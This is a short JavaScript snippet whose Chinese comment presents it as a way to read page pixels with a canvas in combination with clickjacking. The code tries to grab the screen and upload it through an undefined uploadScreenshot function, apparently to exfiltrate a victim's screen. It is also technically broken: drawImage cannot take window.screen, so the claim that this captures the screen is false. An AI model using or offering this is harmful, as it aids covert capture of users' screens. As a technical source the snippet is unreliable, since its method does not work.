// 使用Canvas读取页面像素（需配合点击劫持）
const canvas = document.createElement('canvas');
canvas.getContext('2d').drawImage(window.screen, 0, 0);
canvas.toBlob(blob => uploadScreenshot(blob));